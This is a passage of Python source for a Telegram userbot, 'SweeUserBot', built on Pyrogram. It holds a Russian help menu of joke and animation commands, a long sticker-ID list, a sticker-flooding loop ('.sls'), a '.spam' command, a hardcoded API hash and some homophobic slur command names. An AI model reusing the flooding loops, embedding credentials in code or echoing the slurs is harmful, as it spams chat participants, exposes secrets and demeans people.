#GitHub: TgSweeSoft

from time import sleep
from time import strftime, gmtime
from pyrogram.raw import functions
from phonenumbers import timezone
from phonenumbers import geocoder, carrier
from pyrogram import Client, filters, sync, idle
from simpledemotivators import Demotivator


import os
import time
import random
import asyncio
import datetime
import colorama
import pyrogram
import speedtest
import memoryconv
import phonenumbers
import simpledemotivators
os.system("clear")

app = Client('SUB', api_id=1016382, api_hash='c27834e5683d50a9bacf835a95ec4763')

app.start()

app.stop()
os.system("clear")
print('''•·•·•·•·•·•·•·•·•·•·•·•·•·•·•··•·•·•·•·•·•·•·•·•·•·•·•·•·•·•
		   SweeUserBot-V1.4 alpha
		             ||
———————————————————————————Author———————————————————————————
                           
Telegram: @ROmAanChiG



•·•·•·•·•·•·•·•·•·•·•·•·•·•·•··•·•·•·•·•·•·•·•·•·•·•·•·•·•·•''')
print("")
print('''Скрипт SweeUserBot запущен теперь можешь зайти в 
telegram и в любом чате(группе) написать .help 
и ты получишь список всех анимаций!''')
print("")
print('''ЕСЛИ ЗАКРОЕШЬ Pydroid СКРИПТ РОБОТАТЬ НЕ БУДЕТ
(потому что он не черный)!''')
print()
print()

@app.on_message(filters.command("help", prefixes=".") & filters.me)
def help(app, message):
	app.send_message(message.chat.id,f'''
📙<b> Команды:</b> \n<b> 
1).plus
2).comps
3).care
4).random (0-∞) наример .random 100
5).
6).maslo
7).cat
8).nowar
9).otch
10).unfriend
11).like
12).dislike

13).spam (с новой строки любой текст и количевство сообщений) например:
.spam
текст
100

14).heart
15).mat
16).mk(любой текст) например: .mk привет
17).hack
18).hackp
19).gey
20).friend
21).pidor
22).confess
23).gule
23).numbers
24).eroglifs
25).rep
26).search
27).prof
28).snow
29).hui
30).withoutyou
31).MBI
32).or
33).ft (любой текст) например: .ft привет
34).zaeb (любой ник) например: .zaeb @username
37).time
38).timer (любое число) например: .timer 123
39).pi (номер) например: .pi +7123456 
7890
40).tl (дата и время) например: .tl 2022/10/20 9:05:51
41).date
42).timedate
43).kr (пример) например: .kr 2 * 5 / 9 - 6 + 8
44).st
45).export_session_string
46).dem (с новой строки любой текст и любой текст) например:
.dem
SUB
лучший юзербот

47).fu

💎 сделано: @ROmAanChiG
                                

''', disable_web_page_preview=True)




stick_id_list =  ['CAACAgIAAxkBAAEGy85jlrkW2Oy9yI1a_WnazcyAHdO1xgACvA4AAiwP2Ejnkbm4LkoHpCsE', 'CAACAgIAAxkBAAEGy9BjlrkY7d_qQEo5Of5GE_ooCuvIKAACUxIAAhjPMElphdLYoPfIISsE', 'CAACAgIAAxkBAAEGy9JjlrkaQ34bX3QTTCJSPA-p4CqhsAACXA4AAj62MUlsiCXF-3Jh3SsE', 'CAACAgIAAxkBAAEGy9RjlrkbgaUE0AHFMLlGdLBq9xYqwgACwQ8AAjZ_MUmBHCQa0avWgSsE', 'CAACAgIAAxkBAAEGy9ZjlrkdFHF4O-zWS7ePCGGArIMRmgACTxIAAsFAMEnyyUboRVcVIisE', 'CAACAgIAAxkBAAEGy9hjlrkfN0S6X9MvtjKyA0wT8xWB0wACMw0AAsb44Uh8OfVhqTBOUSsE', 'CAACAgIAAxkBAAEGy9pjlrkgFsDqS5EylqbRN5zCdiow9AACkREAAhwpMEncuMffCMWGaCsE', 'CAACAgIAAxkBAAEGy9xjlrki1jaQbknleP0GtYCuC1m61AAClQ8AAnGAMElLEomWR6sjASsE', 'CAACAgIAAxkBAAEGy95jlrkkVfCyNFn-NgykWK-0jrvHfgACdxUAAohvMUncjmtw39HyrCsE', 'CAACAgIAAxkBAAEGy-BjlrklYhsQdYkJRjgzAof5-kFUqgACcREAAudwMEl4MFMF-N4iJisE', 'CAACAgIAAxkBAAEGy-JjlrknB325dAnubpfBPfph709WQwACxQ8AAsJ4MUkWs-nHEfDwcisE', 'CAACAgIAAxkBAAEGy-RjlrkoO7PwP4mhpOk3prHzNHqQQAACahEAAjgb2Uj3vpbs9h1L-ysE', 'CAACAgIAAxkBAAEGy-Zjlrkrziq0gGOcmvVUhM2FeBqftQACtxEAAsMvQEmHrQnzPVoYXSsE', 'CAACAgIAAxkBAAEGy-hjlrkt_MRRYl1DFQmHewfmEa1cNgACcBAAApp0YEpFq5wpA_aR0CsE', 'CAACAgIAAxkBAAEGy-pjlrkv1CBfpUIyIRrhZBF-3Sim7QACsxEAAs16QUnubq5ZrsLSgSsE', 'CAACAgIAAxkBAAEGy-xjlrkw6kLJREhofKEb99twcn-4oAACgg0AAk6JSElzf85bmRbqsisE', 'CAACAgIAAxkBAAEGy-5jlrkymg_vjyYuRYavcS0odEDCvAACTgsAAis7SElOIna_Kn_mGSsE', 'CAACAgIAAxkBAAEGy_Bjlrk1ka4u5cVVhiOTi96aY4O7rgACxA0AAiGVSEnbny3d0n2p7CsE', 'CAACAgIAAxkBAAEGy_Jjlrk4U9KkQ9R-u89z9wfFBbnHgwAC7A0AAqkBKEmjyk51457jrCsE', 'CAACAgIAAxkBAAEGy_Rjlrk5z2s4LaXc-JOTtI1evfjhXgACtBAAAgHdcUqxmtSP_930jysE', 'CAACAgIAAxkBAAEGy_ZjlrlGItGfpRgzV4jsBZ4HgeZWfAACNBUAAqP4MElKJLQiFSu-ESsE', 'CAACAgIAAxkBAAEGy_hjlrlMLbKHsAanj3zoLunlPSXJdQACCQ8AAh81GUm86Nb1fvIOTysE', 'CAACAgIAAxkBAAEGy_pjlrlVpB_OAAHrbGfrsJ9sTU87KSkAAh4QAALWYfBIMP3aojmvok0rBA', 'CAACAgIAAxkBAAEGy_xjlrlYFefjIxrg6ZMBYtJN6YvtqAACxxAAAp_l-Ei3wZVsWdjD4CsE', 'CAACAgIAAxkBAAEGy_5jlrlfECIsBDmv1NG2uz-vS9ByAQAC-xEAAgi7-UjpIkYaLsqQWysE', 'CAACAgIAAxkBAAEGzAABY5a5aWszNVE7UnmyvNBUnMWZFgIAAlASAAJzkdhI3ieuJc9NIVArBA', 'CAACAgIAAxkBAAEGzAJjlrlvy_Pqxfs79jafTrFEy-18tgACShEAAis42Eh5l31hFJriVisE', 'CAACAgIAAxkBAAEGzARjlrl1VrboBSjFK6mCorCh6H9EngACRREAArxm2Uj28SEOh7gsYSsE', 'CAACAgIAAxkBAAEGzAZjlrl9OoU9zr3Q5-MAAbaFhZ8k18YAAp0NAAKPhdhIbsqz-DWvqEQrBA', 'CAACAgIAAxkBAAEGzAhjlrm6nbiBEwmRz8nGPFZhb3YCvAACZQADokkeMpFx_WaCOsLuKwQ', 'CAACAgIAAxkBAAEGzApjlrm9LFlC002eosaw13TynQcmNwACZwADokkeMvsKeZMsOPIVKwQ', 'CAACAgIAAxkBAAEGzAtjlrm-KDWEHV9SmrBV44RmX-DuYQACaAADokkeMkWvB77ttRCxKwQ', 'CAACAgIAAxkBAAEGzA5jlrnAUvJvD3Z70vwtQmqxFDcxzAACbQADokkeMkj19vu7UssaKwQ', 'CAACAgIAAxkBAAEGzBBjlrnDiIConxGqPWWOnJI33gScRAACbAADokkeMkbXMBXxZb6pKwQ', 'CAACAgIAAxkBAAEGzBJjlrnEuGiT_XdC6IQ7MSkWbtxvZQACawADokkeMo0Q7mkg7VBlKwQ', 'CAACAgIAAxkBAAEGzBRjlrnGILzGZE6SSy1QkEcKTn-BnQACagADokkeMv99KZXi6yQ6KwQ', 'CAACAgIAAxkBAAEGzBZjlrnHXs84oBRp0yW8dXOxBJyuCwACaQADokkeMgMMy8cQoiR5KwQ', 'CAACAgIAAxkBAAEGzBhjlrnOzPsdQm0kbFNwfSdZVD74FwACcQADokkeMsC-glz6mduPKwQ', 'CAACAgIAAxkBAAEGzBpjlrnPCTQ9IFzzLlTsJQ8jslTTkwACbwADokkeMrxGwlCf6r-bKwQ', 'CAACAgIAAxkBAAEGzBxjlrnXNqpKj7EJQ-7sEf-n_fOpcAACcwADokkeMmK4dXwMgReiKwQ', 'CAACAgIAAxkBAAEGzB5jlrnitXTPdol9k3ZeuMtqUcttsAACdgADokkeMjXhiLRaWl1tKwQ', 'CAACAgIAAxkBAAEGzCBjlrnnseNSLqZJMKUR3eMnD_KTtgACdAADokkeMvVyu67qiMMCKwQ', 'CAACAgIAAxkBAAEGzCJjlrnqSeZdgMwgK8q7yQcYCNE63AACfgADokkeMsGHUStaHpMXKwQ', 'CAACAgIAAxkBAAEGzCRjlrnu16AoHsYVd9muh0VPv9iCBwACegADokkeMsBNfeic9tBiKwQ', 'CAACAgIAAxkBAAEGzCZjlrnvaLMWn8oJHmhJoDgcfHAKswACewADokkeMvoPH90cZekdKwQ', 'CAACAgIAAxkBAAEGzChjlrnxdELTWHjzxNRV1sUFBkRRNQACfAADokkeMmTbLfgmLZ9hKwQ', 'CAACAgIAAxkBAAEGzCpjlrnybc222HzYSursl2V9mv8hmAACgQADokkeMgttGClw4i9VKwQ', 'CAACAgIAAxkBAAEGzCxjlrn0uzkXcBybJCppfa5CewABfdEAAoUAA6JJHjIyOuRzwjMrtSsE', 'CAACAgIAAxkBAAEGzC5jlrn1p1urGbS7xsBS9E4EYsfm4AAChgADokkeMl5WhwaWM6z1KwQ', 'CAACAgIAAxkBAAEGzDBjlrn9AAEKvn63ZIUnRtRK7aQy_v8AAocAA6JJHjIF1VkgpDYJlSsE', 'CAACAgIAAxkBAAEGzDJjlroBfeOrqdb0M2DrVAfKGJ_NgQACjQADokkeMs54FZX4EAI6KwQ', 'CAACAgIAAxkBAAEGzDRjlroMj4X1Zo1Y50F0TDVrBp_WygACpAADokkeMvK4AwLKiGkyKwQ', 'CAACAgIAAxkBAAEGzDZjlroU4m9lRYdf_lxDlCG1yVBLuAACrQADokkeMimeaU9k5_s8KwQ', 'CAACAgIAAxkBAAEGzDhjlroXP_E8u2dIfSUsgq1DLEGDLgACrgADokkeMtdqXWXp88tWKwQ', 'CAACAgIAAxkBAAEGzDpjlrog4SVW1nu47pd1L0Ng7FAWRwACUg0AAgFmKEpElP8q_yk9bSsE', 'CAACAgIAAxkBAAEGzDxjlrol27Sm2YxTv2SPNOFPngl39gACBQ0AAjnXMEqj7Ljr6NzBKCsE', 'CAACAgIAAxkBAAEGzD5jlronxxgcJGT0W1YkK-dk8Uz03gAC1BcAAh8bMUmFbJzjWe9qbCsE', 'CAACAgIAAxkBAAEGzEBjlrop04jXQgOFAq-0Z_RldSr8aAACRyEAAgvzKEme4eMGbnukzCsE', 'CAACAgIAAxkBAAEGzEJjlror1-XH8huhwfooSMuPk0bMkQACgRsAAoLIMUlQblBsy8Ps4SsE', 'CAACAgIAAxkBAAEGzERjlrotxoQbAu_C335JB3to-wT72gACLBsAAiCmMUlrp7eQiDSUzCsE', 'CAACAgIAAxkBAAEGzEZjlroxgYAk4WonWYQ-X-qs_gucigACqgwAAg4iMUr6abK_KcppkSsE', 'CAACAgIAAxkBAAEGzEhjlro-r4eANVmtU_kpjonrUWnwdAACHh8AAu1HKUk2sViK-gupWCsE', 'CAACAgIAAxkBAAEGzEpjlrpCo-zb9XnGPZ31k0FPOX2yrQACwR0AAkYGMEkQa3xtAAGrVYorBA', 'CAACAgIAAxkBAAEGzExjlrpDzmciyNf3a-a1G454vv4tmgACsRsAAituKEmEbNcZdWM06ysE', 'CAACAgIAAxkBAAEGzE5jlrpFaZqfgOThDPPlwEU2tBg7LQACqR8AAtpbMUnkX7wPBOpoNSsE', 'CAACAgIAAxkBAAEGzFBjlrpHZO0RZN__Is_ypqOMbqw3rwACkB0AAgEHMEmsukVRoWRPPysE', 'CAACAgIAAxkBAAEGzFJjlrpKUo8dQaGExKi_LFTyi0fFAAMCHQACXVYxSTBQyt_jFtTmKwQ', 'CAACAgIAAxkBAAEGzFRjlrpNzAMsewGDSA2o43wQfN0XwgACZiAAAm4qMUkcZtUSl1CGwCsE', 'CAACAgIAAxkBAAEGzFZjlrpmrJBfDhhcacxvO6w-EXAC0AACXgsAAs6xIErw5CTc8yGTNisE', 'CAACAgIAAxkBAAEGzFhjlrpsbQEWDHBe0BnL0zE44Mh04gAC6Q4AAvRwaEojhGgg-2ajyCsE', 'CAACAgIAAxkBAAEGzFpjlrpz1Kal-lT_o34IGSVL96NoVQACUQ0AAlrmYUoYHB38JQbdOSsE', 'CAACAgIAAxkBAAEGzFxjlrp09HQXpYCJVPCjwyWour7VdwACvQsAAop5aUoq5BtxqVUgCCsE', 'CAACAgIAAxkBAAEGzF5jlrp2kbnaqJRdXQnLkmn4guI3XwACegkAAsyuYUqO8Gw2ZjQCwSsE', 'CAACAgIAAxkBAAEGzGBjlrp4oSUTV9Oji_uGz2fJl5sJ1AACuQwAAlVCaUoYlTYWsLw5qisE', 'CAACAgIAAxkBAAEGzGJjlrp6AAG6rC2aKGvN0vX4WPgg4q0AAhIJAAIQVmhKOMt8DHJrp3krBA', 'CAACAgIAAxkBAAEGzGRjlrp9YfCMfuwCCrMy_TKn40apggACtw4AAg8aaUrXcdIZHjN8oysE', 'CAACAgIAAxkBAAEGzGZjlrqDM_SJrUtFPdRsKePvdE6oZQACFwsAAi4-aErcbxnnWY46uCsE', 'CAACAgIAAxkBAAEGzGhjlrqIFhA3e4i_qs9rr4TL6yJjowACeAoAAuxscEp9E5FvOZm6EysE', 'CAACAgIAAxkBAAEGzGpjlrqLnlxORqQqFHm28yArcnniRQACLhAAAlGXcUp9YeXtTby3tSsE', 'CAACAgIAAxkBAAEGzGxjlrqRrhyFQXpy4gogmsaJRcDhHQACkw0AAlxe8UrDaGOb5aH9USsE', 'CAACAgIAAxkBAAEGzG5jlrqZBnlbsjSQZIo1qzToUur_IAACEQsAAmfAWUvqnJKo9FMltisE', 'CAACAgIAAxkBAAEGzHBjlrqasJo2y7XQXKxiOcm3pUoVWQACcwwAAo9rWUtOeZVnyhZozysE', 'CAACAgIAAxkBAAEGzHJjlrqrtZKpIDnghiWacTq4wxDamgACfwsAAovS2UuSmCAAAfQF0tIrBA', 'CAACAgIAAxkBAAEGzHRjlrqscxlnJVojyaPJR9B7kupANQAC6A0AAkbS2Uv-JXTclE-zKSsE', 'CAACAgIAAxkBAAEGtlJjj7J4nTMbeCo3EJ9w1vVX1GSD5AACKwEAArFIiQXsODXpF2UDZysE', 'CAACAgIAAxkBAAEGtlRjj7J7VwFvOz7noAm_FTG6YbtsLwACfAADBm_OG_RWtaO0XfBDKwQ', 'CAACAgIAAxkBAAEGtlZjj7J-3oiA-M4b0f51HbKRUPiqXgACxBAAArj20Uu1G-OOG34DcisE', 'CAACAgIAAxkBAAEGtlhjj7KIs3mGqRxehgQmpJbfqQH-CAACYQ4AAoE5YEhskEisgGgbuysE', 'CAACAgIAAxkBAAEGtlpjj7KnwwiKGXvWf6nHpUODkmtIBwAC1w4AAj2UcUtF67STehVw4ysE', 'CAACAgQAAxkBAAEGtlxjj7K_HvQc3j7fNws059Wb2HK_GgACtBEAAqbxcR5ziK9kbVA2sCsE', 'CAACAgQAAxkBAAEGtl5jj7LGupwAAfI4vSH_U6sGZAuUb6gAAhAMAAK2EBFTChDHTpxadDorBA', 'CAACAgQAAxkBAAEGtmBjj7LLb2sVLprLEEgQW-wKbA8olwAC6REAAqbxcR4suLN3od21sisE', 'CAACAgQAAxkBAAEGtmJjj7LPgAm0gn_odEk0jTpgxQ2FRgAC4gwAAih0GVPLutRasaibiSsE', 'CAACAgIAAxkBAAEGtmRjj7LfdlosDWoAAfr86DebT4JsdYQAAngAAwZvzhtYgUbCrvGhxCsE', 'CAACAgIAAxkBAAEGtmZjj7LlicbbpDPZMUBGox0xAAHuHkEAAoMAAwZvzhvmV8Hxa35sLysE', 'CAACAgIAAxkBAAEGtmhjj7LvrflEoggaEI7hb4gErXIyeQACsQgAAtnuwEmsQ-hWvtKRpisE', 'CAACAgIAAxkBAAEGtmpjj7L8A4uLwYNsySRTi4PCbLMIugACIwEAArFIiQV6d_7jvmb2PisE', 'CAACAgIAAxkBAAEGtmxjj7MCAywe3xpX92C1Qd7CvacCOgACSxgAAjpuWUt_tNKd2-DonisE', 'CAACAgIAAxkBAAEGtm5jj7MT1orS_IlLlGaWJ5PqHxYHpgACAQ0AAoC9aEqIClv24xN0MCsE', 'CAACAgIAAxkBAAEGtnBjj7MayZ65hPL2wHfBNAbODhJPuAACHQUAAhnydRtPZKWXoQzGDisE', 'CAACAgQAAxkBAAEGtnJjj7MuS1oCx0dB7MOangcCZten7wACGAEAAmaa2yqBFyIAAW4sCWQrBA', 'CAACAgIAAxkBAAEGtnRjj7M6H4frh8NxmCt2nFgpEEyovwACHwADBm_OG3ONMVjYt99LKwQ', 'CAACAgIAAxkBAAEGtnZjj7NDWoj-u0WIUVD-RLv1I1E_yQACOxoAArFsWUrsPR_3P0f6JSsE', 'CAACAgIAAxkBAAEGtnhjj7NPVZMYIpKROuclBBTBE5FZMwACiAcAAhnydRvZQtYhsW3UeCsE', 'CAACAgIAAxkBAAEGtnpjj7NcvaJ1lmeXOWi3FETHkTRnEwAC_wwAAvEd-EjxNlP5q5f0-ysE', 'CAACAgIAAxkBAAEGtnxjj7NpF5ERR_QoJyLr20rwLngYeQAC4BIAAp4i0UuHd5LMxNHVpisE', 'CAACAgIAAxkBAAEGtn5jj7N29UkKRm-MTfiqRnatKRlL3wACBQEAAjDUnRHjuap2nB4GSysE', 'CAACAgQAAxkBAAEGtoBjj7ORiQiyNW0qvmQpCAXZcsVpzAACtxEAAqbxcR4_xTH4K_ztQSsE', 'CAACAgQAAxkBAAEGtoJjj7OYt7vc3RYxnYV_s3EEMculuwAC7xEAAqbxcR5JBxdnmo7VIysE', 'CAACAgQAAxkBAAEGtoRjj7OczYCC9KAV4z149DpGSehbUQACsxEAAqbxcR5PXtD5GcqQyysE', 'CAACAgQAAxkBAAEGtoZjj7Oe2J7M-nB8z9bklbmYfUIF7gACtBEAAqbxcR5ziK9kbVA2sCsE', 'CAACAgQAAxkBAAEGtohjj7OgW3xM5qVVnk4pbMHf2RIxBwACrBEAAqbxcR5byZw_FGeM_SsE', 'CAACAgIAAxkBAAEGtpNjj7PIK2OEatdTLHQpEvvH-7bUZQACMxQAAlPryUvGOIcObQL_FCsE', 'CAACAgIAAxkBAAEGtpVjj7POPv2mIIQgTxolYgbsj2hHWgACTxcAA9bRS1w0lGI5ZWVpKwQ', 'CAACAgUAAxkBAAEGtpljj7P0-OU-WMSKjdqhL9V0B7X7xgACTgcAAohZ8VcpSMZbNySGjysE', 'CAACAgUAAxkBAAEGtptjj7P67R8CYxZOWGzjlF0iO-j6nQACVwQAAuJk8FceQcaULLrqdisE', 'CAACAgIAAxkBAAEGtp1jj7QIaIZftxSu4prghc4OelAk1gACuBIAAjPPKEjGwgEmt4kCwSsE', 'CAACAgIAAxkBAAEGtp9jj7QKY78xIkAYk8dYMhlVUlnShAACrRgAAhufIUho5edAJjn4nisE', 'CAACAgIAAxkBAAEGtqRjj7QsKpTdvn1Jn6uEi0MpwNTGcAACUAADwNw1NQABB4ca_oOFFSsE', 'CAACAgIAAxkBAAEGtqhjj7Q-kzoXOHRla0AhlF-WV7QmSgACnwADwNw1Nd1CUdx1YA_sKwQ', 'CAACAgIAAxkBAAEGtqpjj7RQTWPPSG9KKpKPrXTaQWg3HAACFgcAAhnydRtjbJEjisyo5isE', 'CAACAgIAAxkBAAEGtqxjj7Rfo79__mcHUgcPR0AqQuoQvwACQAcAAhnydRszXWe06StGlSsE', 'CAACAgIAAxkBAAEGtq5jj7RnXVY3nMtBYZrwEuQMOB-1YAACBQcAAhnydRu1_vgLl4hHDysE', 'CAACAgIAAxkBAAEGtrBjj7R2Wmri3WMui7vte2t9nvvWEgACAxkAArnSeUv2OU4ScLIEoSsE', 'CAACAgIAAxkBAAEGtrRjj7TgsI0upnLeMAMYW2CE9wsWegACSxgAAjpuWUt_tNKd2-DonisE', 'CAACAgIAAxkBAAEGtrZjj7Th4gQPiLgOefPhTKc4fHCh5AACHRcAAo0jWEu1DKsZWsG6_CsE', 'CAACAgIAAxkBAAEGtrhjj7TtseYCZid2CZe5Ha9kAs987QAC0BAAAsxC-EiGVa4t017g2CsE', 'CAACAgIAAxkBAAEGtrpjj7UQ0or5_hEKyso8597Ljx2e4AAC4RMAAm160EvBi6Kv1W4WiysE', 'CAACAgIAAxkBAAEGtrxjj7UgEXITZfUf28xOSclkY43fMQACbBUAAvwu-Et7tJL-ndhxDisE', 'CAACAgIAAxkBAAEGtr5jj7Um-tJyXOAbeVSR2RVHhhK8FgACMgADZGFxLnyYuz6-XjWuKwQ', 'CAACAgIAAxkBAAEGtsBjj7Ut0PcdmHFT6ijiKW0OdkBZ3AACkhQAAjxDwUqyTHSmmAVOpSsE', 'CAACAgIAAxkBAAEGtsJjj7UvmP-WiSXlAR9wyjb71ksdBAAChRIAAhOiwErm2hI-KthkhysE', 'CAACAgIAAxkBAAEGtsRjj7UzAtCrAtImLwYV6HfvcBrQWgACSBUAAoOlwUrhbk0h6cWH7isE', 'CAACAgIAAxkBAAEGtsZjj7U87Cdd6EwPvrcw_Bb3MxwkwAACFRYAAtqQyUoyKtR61sg91isE', 'CAACAgIAAxkBAAEGtshjj7U-q6LxASs0PvaUm45vJuGf1gACKxIAAlFJwErtaoyXF4Q1VysE', 'CAACAgIAAxkBAAEGtspjj7U_GgkBS9IVlbPinpeDEVub0QACYxUAAh3DwUqJAgoAAYTnursrBA', 'CAACAgIAAxkBAAEGtsxjj7VBWUsV_KFULKB0GQlTwnpg-AACaxMAAmuWyUpnxgW0wDxhLisE', 'CAACAgIAAxkBAAEGts5jj7VOfL2gAqRmBQkvGbVVf1zspAACiRIAAjxgwUqpqZblHOEiKSsE', 'CAACAgIAAxkBAAEGttBjj7VqjT8JMViIfQIfKJ_f9ZzSzgADDgACMFVpStXTv1uvdAE4KwQ', 'CAACAgIAAxkBAAEGttJjj7V1BbZGSmt1Rek3MoidMTzKkgACfwsAAovS2UuSmCAAAfQF0tIrBA', 'CAACAgIAAxkBAAEGttRjj7WGqQ0T7sE92KKNf4ad0XQOHgACYgoAAjJwwEvlzuCHiEuKIysE', 'CAACAgIAAxkBAAEGttZjj7WLkuLQQiyYU3RhdyW4XvNKWAAC9goAAimjwEv2ouzeOIJxNisE', 'CAACAgIAAxkBAAEGttpjj7WajT5i-VDzfNvgkbJG2zuCBgAChgoAApkAAVhLN5Ly87en1mQrBA', 'CAACAgIAAxkBAAEGttxjj7WdBXmF3QpkKKgAAZuYWIxSKH0AAqENAAJjDlhLsg_j2pxVH-QrBA', 'CAACAgIAAxkBAAEGtt5jj7WsjLfGyfHVNI6Qh05SgKJvfAACMQ8AAg6qcEpCr4bDiPkaTCsE', 'CAACAgIAAxkBAAEGtuBjj7WuUEDc9_d1t4NdfC_KOS8m8QACLhAAAlGXcUp9YeXtTby3tSsE', 'CAACAgIAAxkBAAEGtuJjj7Ww9RvUziEszWApP_OzLbijCAACewkAArsHcEqjFOEXS3qR5SsE', 'CAACAgIAAxkBAAEGtuRjj7W1jiFX1PzfIm3oVEL3yB4zWwACRgsAAqkTcEpxX8SBIgWzBCsE', 'CAACAgIAAxkBAAEGtuZjj7W3HnDxzS1SPytgx7iNsuYgrAACeAoAAuxscEp9E5FvOZm6EysE', 'CAACAgIAAxkBAAEGtuhjj7W5AAFGiXPcNVemMcQ6O8bNaRgAAo4KAALo0mlKyaUoTi_pZRIrBA', 'CAACAgIAAxkBAAEGtupjj7XAlrMAASL296QXbxn1UgR-po0AAukOAAL0cGhKI4RoIPtmo8grBA', 'CAACAgIAAxkBAAEGtuxjj7XD3hp2zclfot-M3In3Tdgb1gADDgACMFVpStXTv1uvdAE4KwQ', 'CAACAgIAAxkBAAEGtu5jj7XtwLM4IPSK42ghkfWs_S640wACXA0AAtMJ-UjQvDfRcs3YlCsE', 'CAACAgIAAxkBAAEGtvBjj7Xu_oXeTBVR8EFm-g68z9IMAQACqQ0AAgsV-UiYH5U3BzUAAewrBA', 'CAACAgIAAxkBAAEGtvJjj7X2mRd77C-JUCsw0g4cIjHnPgAC5gwAAsvdAAFJXwAB2C9LoaYvKwQ', 'CAACAgIAAxkBAAEGtvRjj7X82AnjzXlu-pvtsw2oNgzGGwAC8gsAAtaFCUlOV3iGD8RQRisE', 'CAACAgIAAxkBAAEGtvZjj7X-iAt89QABblUdA3fhtnxzNJkAAoIPAALsJQABSXrdl1hi31jgKwQ', 'CAACAgIAAxkBAAEGtvhjj7YWYX318ByCEb0PJWhAMA1lEQACXgsAAs6xIErw5CTc8yGTNisE', 'CAACAgIAAxkBAAEGtvpjj7YZmXjY9Or9HeYTYnVEGIbmOwACBgsAAunjIUoqyO-T9bvr2SsE', 'CAACAgIAAxkBAAEGtvxjj7YbvNO1Q2EPBhAxrEYRg274rwACwQ0AAqroIUp5zyIgFOhEhCsE', 'CAACAgIAAxkBAAEGtv1jj7Yc-C_QZFTDNKCER6DBpccM9QACtw4AAtHiKErc4zKcHsmEvysE', 'CAACAgQAAxkBAAEGtwABY4-2I6arvfFJ3AXpO_8CYu4-V8MAAt4AA2aa2yrFnexSDvNxXCsE', 'CAACAgQAAxkBAAEGtwJjj7YmKVCty-j1sapGvHT8mvynBgAC4gADZprbKpEtB0ytipUwKwQ', 'CAACAgQAAxkBAAEGtwRjj7YpqVmlbbeJh0BxPAAB8CzvCCEAAukAA2aa2ypnyQ7z2ctlbysE', 'CAACAgQAAxkBAAEGtwZjj7YwhWiG6Og0VhgxrRgvnc3IAAPxAANmmtsq8sr-kXjNpVMrBA', 'CAACAgQAAxkBAAEGtwhjj7Y7ohX2x6KUmOlxAAFyvRFj5BMAAh0BAAJmmtsqAAEyL7dQtqV7KwQ', 'CAACAgQAAxkBAAEGtwpjj7Y8SJEFBPMsRSHINvByFYRnBQACIQEAAmaa2ypoA4sETv7FvysE', 'CAACAgQAAxkBAAEGtwxjj7Y_PmloIH673VF2WSUv_Vq6EQACLAEAAmaa2yq687rrGlTnuisE', 'CAACAgQAAxkBAAEGtw5jj7ZKMIUhWlrRW80_eqL_5znuNAACUAEAAmaa2yoGzj_0O1kzZisE', 'CAACAgQAAxkBAAEGtxBjj7ZTxO6rfBiajGrsEzO_qHMK4QACVQEAAmaa2ypnJqLeBYr3pCsE', 'CAACAgIAAxkBAAEGtxRjj7ZuijQ7k83JzdZj1sAtffToHAACXGQAAuCjggf0Vzb1TqF7fSsE', 'CAACAgIAAxkBAAEGtxZjj7Z0GO332xNXCjh9n63hKrY8HgACbGQAAuCjggezqUtKK2UydCsE', 'CAACAgEAAxkBAAEGtxhjj7Z_X1QGH8x0nRxI6xtlfLuDcgACogAD8PrXP3kIlVo58e2jKwQ', 'CAACAgEAAxkBAAEGtxpjj7aBLgzLqaUYi_sPvZCcVALEcgACmQAD8PrXP8FS7sPq_zJNKwQ', 'CAACAgEAAxkBAAEGtxxjj7aDIGKL37aW4RblhD-13cAzswACmwAD8PrXP6j_5xzDMgRZKwQ', 'CAACAgEAAxkBAAEGtx5jj7aLTPzTlaIZz5l9vVEtcmDeoAACbwQAAvD61z_fqaYLCiwWiysE', 'CAACAgIAAxkBAAEGtyBjj7aWtTsHTdWozAKBSLcNdNT7eQACiw0AAg4XaEmNH1EYpq0YZisE', 'CAACAgIAAxkBAAEGtyJjj7aYoSYaWLC3AWNVmyJPaXrXsQACYBAAAjQroEmfSZRmW5CwCysE', 'CAACAgIAAxkBAAEGtyRjj7asPJ6Cs1FUJNPSeGMIRwAB0DsAAhYHAAKw8tlJVTzVU_k0MYIrBA', 'CAACAgIAAxkBAAEGtyhjj7bv4CosUcSDxJxdovSzCcNgJwACOhMAAl6lKEpfg8Al5twegCsE', 'CAACAgIAAxkBAAEGtypjj7byl45Mn3rOb3Cxi3c1n-y8GwACFBUAAq8LKUrQtXEd7RUUXisE', 'CAACAgIAAxkBAAEGtytjj7by7tWynIbsQFaXELUPCdw_wQACZBMAAun0KUr-bQpZThyVyCsE', 'CAACAgIAAxkBAAEGty5jj7b-Sil5z5HXIR4pFK7esVfddgACqhMAAiQZKEonzD9v25iAiSsE', 'CAACAgIAAxkBAAEGtzBjj7cJeYCyJ8o-0Rs7bOSn-eEBJAACgRAAAvc2KErjW-viiv1CSCsE', 'CAACAgIAAxkBAAEGtzJjj7cPk_8wBkfN38suzuwcqG6e-QACLhQAAj1uKUoTW5uhi8dKfSsE', 'CAACAgIAAxkBAAEGtzRjj7ccW7sRxVWun-S4yf0LIdgk0AACRREAAhN0KUqtz_jVweYPESsE', 'CAACAgIAAxkBAAEGtzZjj7ckRqlVG-T0YLw_z_6v4eAMagACvhUAAlYcKUoJxj88r25d5CsE']





@app.on_message(filters.command("sls", prefixes=".") & filters.me)
def send_love_stickers(app, message):
	app.delete_messages(message.chat.id, message.id)
	sls0 = message.text.split("\n", maxsplit=2)
	sls1 = sls0[1]
	sls2 = sls0[2]
	print(sls0)
	for i in range(int(sls1)):
		app.send_sticker(message.chat.id, sticker=random.choice(stick_id_list))
		sleep(float(sls2))







@app.on_message(filters.command("plus", prefixes=".") & filters.me)
def plus(_, msg):
    time = 0.6
    for i in range(1):
        msg.edit(f'''
➕
''')  
        sleep(3)  
        msg.edit(f'''
хуета..
''')
        sleep(2)  
        msg.edit(f'''
🔲
''')
        sleep(0.1)  
        msg.edit(f'''
🔲🔲
''')  
        sleep(0.1)  
        msg.edit(f'''
🔲🔲🔲⬜️⬜️
''')  
        sleep(0.1)  
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
''')  
        sleep(0.1)  
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲
''')  
        sleep(0.1)  
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲
''')  
        sleep(0.1)  
        msg.edit(f'''
🔲🔲🔲⬜️⬜️🔲🔲🔲
🔲🔲🔲⬜️⬜️🔲🔲🔲
''')  
        sleep(0.1)  
        msg.edit(f'''
